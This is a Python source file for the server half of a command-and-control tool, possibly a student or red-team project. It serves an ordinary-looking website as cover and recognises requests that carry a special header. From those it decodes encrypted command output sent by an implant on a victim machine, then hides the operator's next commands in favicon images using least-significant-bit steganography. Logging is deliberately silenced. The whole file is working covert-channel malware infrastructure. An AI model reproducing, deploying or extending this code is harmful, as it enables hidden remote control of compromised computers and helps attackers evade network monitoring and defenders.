'''
Executes on the C2 server. Runs an HTTP server that listens for requests from the client.

Assumes only one client connects.
'''

from http.server import SimpleHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import base64
import zlib
import threading
from queue import Queue
import time
from Crypto.Cipher import AES
from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, AES_KEY, AES_IV, RequestFlags
from PIL import Image

WEB_DIRECTORY = 'web' # Root directory of website files.

# The inputs entered by the user, to be sent to the client to be executed (the `queue` library is thread-safe)
user_inputs = Queue()
# The current message being formed via requests from the client. Only print when the complete message is formed.
current_message_encoded_strs = Queue()

    
def get_original_message(encoded_message: str, request_flags: RequestFlags):
    # 1. Decode
    decoded_bytes = base64.b64decode(encoded_message)
    # 2. Decompress (unless it's not compressed)
    decompressed_bytes = decoded_bytes
    if RequestFlags.IS_NOT_COMPRESSED not in request_flags:
        decompressed_bytes = zlib.decompress(decoded_bytes)
    # 3. Unencrypt
    decryptor = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV)
    return decryptor.decrypt(decompressed_bytes).decode()

def wait_for_user_input():
    global user_inputs
    # Wait for user input.
    while (user_inputs.empty()):
        time.sleep(1)


class RequestHandler(SimpleHTTPRequestHandler):
    '''
    Instantiated on each HTTP request to handle the request.
    '''
    def __init__(self, *args, **kwargs):
        # Set directory to be the web directory
        super().__init__(*args, directory=WEB_DIRECTORY, **kwargs)
    
    def log_message(self, format, *args):
        pass # Do nothing (silences logs)

    def is_stego_request(self):
        '''
        Check if this request is steganographic communication from the client
        or just a normal request from a browser.
        '''
        # Check if stego header is present.
        return self.headers.get(STEGO_HEADER_NAME)

    def get_request_encoded_str(self):
        ''''
        Get encoded str from request, excluding flags
        '''
        return self.headers.get(STEGO_HEADER_NAME)[1:]
    
    def get_request_flags(self):
        char = self.headers.get(STEGO_HEADER_NAME)[0]
        return RequestFlags.get_flags_from_char(char)

    def serve_normal_web_content(self):
        '''
        Serves 'normal' HTML pages from the website, not used for steganographic communication.
        '''
        mimetype = 'text/html'
        if self.path == '/':
            self.path = '/index.html'
        elif self.path == '/imgs/favicon.ico':
            self.path = '/imgs/favicon.ico'
            mimetype = 'image/x-icon'
        else:
            self.path = '/index.html' # for now, all other requests just return the index page regardless of path
        self.path = self.directory + self.path
        try:
            if mimetype == 'image/x-icon':
                with open(self.path, "rb") as f:
                    file_content = f.read()
                    self.send_response(200)
                    self.send_header('Content-Type', mimetype)
                    self.end_headers()
                    self.wfile.write(file_content)   
            else:
                with open(self.path, "r") as f:
                    file_content = f.read()
                    self.send_response(200)
                    self.send_header('Content-Type', mimetype)
                    self.end_headers()
                    self.wfile.write(bytes(file_content, 'utf-8'))       
        except:
            print('file not found')
            file_content = 'File not found.'
            self.send_response(404)
            self.end_headers()
            self.wfile.write(bytes(file_content, 'utf-8'))

    def send_user_input_response(self):
        '''
        Send a steganographic response containing user input
        '''
        favicon_input = "web/imgs/favicon.ico"
        encode_text_in_favicon(user_inputs.get(),favicon_input)
        hidden_path = "secret_web/secret.ico"
        with open(hidden_path, 'rb') as f:
            ico_data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "image/x-icon")
        self.end_headers()
        # Write user input to HTML file contents (TODO: use image steganography instead)
        self.wfile.write(ico_data)
    
    def send_dummy_response(self):
        '''
        Send a normal website response NOT containing any steganographic content
        '''
        self.serve_normal_web_content()

    def do_GET(self):
        # Check if request is steganographic communication or just regular browser traffic.
        if not self.is_stego_request():
            self.serve_normal_web_content()
            return    

        encoded_str = self.get_request_encoded_str()
        if len(encoded_str) == 0:
            print("\n\n")
            wait_for_user_input()
            self.send_user_input_response()
            return
        
        global current_message_encoded_strs
        current_message_encoded_strs.put(encoded_str)
        request_flags = self.get_request_flags()

        # Check if this steganographic request is the last one in message, or if more requests are incoming.
        if RequestFlags.IS_END_OF_MESSAGE not in request_flags:
            self.send_dummy_response()
            return
        encoded_full_message = ""
        while not current_message_encoded_strs.empty():
            encoded_full_message += current_message_encoded_strs.get()
        current_message_encoded_strs = Queue() # Reset queue
        # Display command output from client machine
        print("\n" + get_original_message(encoded_full_message,  request_flags) + "\n")
        wait_for_user_input()
        self.send_user_input_response()
        
class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

def run_http_server():
    server = ThreadingSimpleServer((LISTENER_IP, LISTENER_PORT), RequestHandler)
    server.serve_forever()

def encode_text_in_favicon(input_text, input_path):
    # Open the ICO file and extract the first frame
    img = Image.open(input_path)
    img = img.convert("RGB")  # Convert to RGB to ensure consistency
    pixels = list(img.getdata())
    
    # Convert text to binary and append the end marker
    binary_text = ''.join(format(ord(char), '08b') for char in input_text) + '1111111111111110'

    # Pad binary text to make its length divisible by 3
    padding_length = (3 - (len(binary_text) % 3)) % 3
    binary_text += '0' * padding_length

    if len(binary_text) > len(pixels) * 3:
        raise ValueError("Text is too long to hide in this image.")
    
    # Encode text into pixel LSBs
    new_pixels = []
    binary_index = 0
    for pixel in pixels:
        r, g, b = pixel
        if binary_index < len(binary_text):
            r = (r & 0xFE) | int(binary_text[binary_index])
            binary_index += 1
        if binary_index < len(binary_text):
            g = (g & 0xFE) | int(binary_text[binary_index])
            binary_index += 1
        if binary_index < len(binary_text):
            b = (b & 0xFE) | int(binary_text[binary_index])
            binary_index += 1
        new_pixels.append((r, g, b))
    
    # Create a new image with the modified pixel data
    new_img = Image.new("RGB", img.size)
    new_img.putdata(new_pixels)
    
    # Save the image back in ICO format
    new_img.save("secret_web/secret.ico", format="ICO")

def main():
    #favicon_input = "web/images/favicon.ico"
    # Run the http server in a background thread.
    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True # Ensures thread ends on main program exit.
    server_thread.start()
    while(True):
        global user_inputs
        user_inputs.put(input())

if __name__ == '__main__':
    main()